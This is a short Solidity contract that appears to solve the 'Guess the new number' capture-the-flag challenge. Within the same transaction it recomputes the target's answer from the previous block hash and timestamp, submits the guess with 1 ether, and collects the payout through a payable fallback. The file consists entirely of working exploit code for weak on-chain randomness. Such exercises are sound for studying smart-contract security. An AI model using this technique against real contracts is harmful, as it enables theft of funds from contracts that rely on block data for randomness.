pragma solidity ^0.4.21;

import "./GuessTheNewNumberChallenge.sol";

contract Solution {
    function solve(GuessTheNewNumberChallenge _instance) external payable {
        require(msg.value >= 1 ether);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        _instance.guess.value(1 ether)(answer);
    }

    function() public payable {}

}